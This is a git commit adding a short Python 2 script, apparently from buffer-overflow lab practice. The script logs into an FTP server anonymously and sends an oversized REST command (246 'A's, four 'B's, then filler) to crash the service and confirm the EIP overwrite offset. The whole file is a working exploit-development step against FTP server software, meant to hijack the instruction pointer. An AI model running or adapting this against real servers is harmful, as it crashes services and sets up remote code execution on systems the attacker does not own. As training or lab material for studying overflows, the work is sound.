cdf6b10a0057e555272aafb1f0f4108dd7f8870c
crankyyash <61792333+crankyyash@users.noreply.github.com>
2020-05-27 09:14:08 -0400

    Create locate-eip.py

---
+++ locate-eip.py
@@ -0,0 +1,22 @@
+import socket
+#with open("pattern.txt","r") as file:
+#	buffer=file.read().replace("\r","")
+#print len(buffer)
+#print buffer
+#pattern : 41326941 , pattern offset match at 246
+#increase total buffer length to 600 so that "C"'s can occupy min 350 bytes of space
+buffer="A"*246 + "B"*4 + "C"*(600-246-4)
+ip="10.11.20.10"
+try:
+	print "\n locating eip by crashing with %s bytes" %len(buffer)
+	s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+	s.connect((ip,21))
+	s.send("USER anonymous\r\n")
+	s.recv(1024)
+	s.send("PASS test\r\n")
+	s.recv(1024)
+	s.send("REST " + buffer + "\r\n")
+	s.send("QUIT\r\n")
+	s.close()
+except:
+	print "\nConnection error"
